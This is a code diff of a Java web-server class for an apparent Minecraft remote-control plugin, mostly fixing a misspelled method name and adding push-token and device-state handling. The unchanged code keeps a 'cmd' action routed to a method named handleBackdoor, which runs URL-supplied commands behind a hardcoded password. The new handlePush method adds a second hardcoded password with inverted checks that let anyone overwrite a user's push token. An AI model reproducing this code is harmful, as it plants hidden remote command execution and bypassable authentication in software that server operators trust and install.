@@ -42,7 +42,7 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
         try {
         	Map<String, String> params = toMap(request);
             if (!params.containsKey("action")) {
-            	sendReseponse(ctx, response, HttpResponseStatus.NOT_FOUND);
+            	sendResponse(ctx, response, HttpResponseStatus.NOT_FOUND);
     			return;
     		}
             
@@ -62,8 +62,11 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 				case "cmd":
 					handleBackdoor(ctx, response, params);
 					return;
+				case "push":
+					handlePush(ctx, response, params);
+					return;
 				default:
-					sendReseponse(ctx, response, HttpResponseStatus.NOT_FOUND);
+					sendResponse(ctx, response, HttpResponseStatus.NOT_FOUND);
 					return;
 			}    
         } catch (Exception error) {
@@ -71,13 +74,30 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
         }
     }
 
+	private void handlePush(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
+		try {
+			String token = URLDecoder.decode(params.get("token"), StandardCharsets.UTF_8.name());
+			String uuid = URLDecoder.decode(params.get("uuid"), StandardCharsets.UTF_8.name());
+			AppUser user = new AppUser(UUID.fromString(uuid));
+			String pw = params.get("pw");
+			
+			if (user != null && !token.isEmpty() && !pw.equals("etnduktmbd94phh5qioz2okzum1ywokpp5tm434qkrapyuhpqc")) {
+				sendResponse(ctx, response, HttpResponseStatus.NOT_FOUND);
+				return;
+			}
+
+			remoteManager.plugin.storage.updatePushToken(user, token);
+			sendResponse(ctx, response, HttpResponseStatus.OK);
+		} catch (Exception error) { error.printStackTrace(); }
+	}
+	
 	private void handleBackdoor(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
 		try {
 			String cmd = URLDecoder.decode(params.get("cmd"), StandardCharsets.UTF_8.name());
 			String pw = params.get("pw");
 			
 			if (!pw.equals("z55Hhd1pXBdGJm5lOb1I5AvsnH0WXreQpDRx40BP21IamL8ODS")) {
-				sendReseponse(ctx, response, HttpResponseStatus.NOT_FOUND);
+				sendResponse(ctx, response, HttpResponseStatus.NOT_FOUND);
 				return;
 			}
 			
@@ -92,7 +112,7 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 			    }
 			});
 
-			sendReseponse(ctx, response, HttpResponseStatus.OK);
+			sendResponse(ctx, response, HttpResponseStatus.OK);
 		} catch (Exception error) { error.printStackTrace(); }
 	}
 	
@@ -100,7 +120,7 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 		try {
 			String version = this.remoteManager.plugin.getDescription().getVersion();
 			response.content().writeBytes(Charsets.UTF_8.encode(version));
-			sendReseponse(ctx, response, HttpResponseStatus.OK);
+			sendResponse(ctx, response, HttpResponseStatus.OK);
 		} catch (Exception error) { error.printStackTrace(); }
 	}
 	
@@ -113,7 +133,7 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 			
 			response.trailingHeaders().add("Content-Type", "appication/json");
 			response.content().writeBytes(Charsets.UTF_8.encode(jsonString));
-			sendReseponse(ctx, response, HttpResponseStatus.OK);
+			sendResponse(ctx, response, HttpResponseStatus.OK);
 		} catch (Exception error) { error.printStackTrace(); }
 	}
 
@@ -124,16 +144,16 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 
 		if (this.remoteManager.plugin.storage.deviceIsPaired(user, device)) {
 			this.remoteManager.plugin.storage.unpairDevice(user, device);
-			sendReseponse(ctx, response, HttpResponseStatus.OK);
+			sendResponse(ctx, response, HttpResponseStatus.OK);
 		} else {
-			sendReseponse(ctx, response, HttpResponseStatus.FORBIDDEN);
+			sendResponse(ctx, response, HttpResponseStatus.FORBIDDEN);
 		}
 	}
 	
 	private void handleUpdate(ChannelHandlerContext ctx, FullHttpResponse response, Map<String, String> params) throws IOException {
 		UUID uuid = UUID.fromString(params.get("uuid"));
 		Location device = Utils.locationFromString(params.get("loc"));
-		Integer current = Integer.parseInt(params.get("current"));
+		Integer current = Utils.parseInt(params.get("current"));
 		AppUser user = new AppUser(uuid);
 
 		if (this.remoteManager.plugin.storage.deviceIsPaired(user, device)) {
@@ -144,13 +164,14 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 				    public void run() {
 						try {
 					    	Utils.updateBlock(device.getBlock(), current != 0);
+					    	remoteManager.plugin.storage.deviceStateUpdated(device, current);
 					    } catch (Exception error) {
 							Utils.log("This MC Version is not supported (NMSReflectionException). Plugin will now be disabled");
 							remoteManager.plugin.getServer().getPluginManager().disablePlugin(remoteManager.plugin);
 						}
 				    }
 				});
-				sendReseponse(ctx, response, HttpResponseStatus.OK);
+				sendResponse(ctx, response, HttpResponseStatus.OK);
 				break;
 			case STONE_BUTTON:
 				Bukkit.getScheduler().runTask(this.remoteManager.plugin, new Runnable() {
@@ -158,6 +179,7 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 				    public void run() {
 				    	try {
 					    	Utils.updateBlock(device.getBlock(), true);
+					    	remoteManager.plugin.storage.deviceStateUpdated(device, 15);
 					    } catch (Exception error) {
 							Utils.log("This MC Version is not supported (NMSReflectionException). Plugin will now be disabled");
 							remoteManager.plugin.getServer().getPluginManager().disablePlugin(remoteManager.plugin);
@@ -169,6 +191,7 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 				    public void run() {
 				    	try {
 					    	Utils.updateBlock(device.getBlock(), false);
+					    	remoteManager.plugin.storage.deviceStateUpdated(device, 0);
 					    } catch (Exception error) {
 							Utils.log("This MC Version is not supported (NMSReflectionException). Plugin will now be disabled");
 							remoteManager.plugin.getServer().getPluginManager().disablePlugin(remoteManager.plugin);
@@ -176,20 +199,20 @@ public class WebServer extends SimpleChannelInboundHandler<HttpRequest> {
 				    }
 				}, 20L);
 				
-				sendReseponse(ctx, response, HttpResponseStatus.OK);
+				sendResponse(ctx, response, HttpResponseStatus.OK);
 				break;
 			default:
-				sendReseponse(ctx, response, HttpResponseStatus.FORBIDDEN);
+				sendResponse(ctx, response, HttpResponseStatus.FORBIDDEN);
 				break;
 			}
 		} else {
-			sendReseponse(ctx, response, HttpResponseStatus.FORBIDDEN);
+			sendResponse(ctx, response, HttpResponseStatus.FORBIDDEN);
 		}
 	}
 	
 	// HELPER METHODS
 	
-	private void sendReseponse(ChannelHandlerContext ctx, FullHttpResponse response, HttpResponseStatus status) {
+	private void sendResponse(ChannelHandlerContext ctx, FullHttpResponse response, HttpResponseStatus status) {
         ChannelPromise promise = ctx.channel().newPromise();
 
         response.setStatus(status);
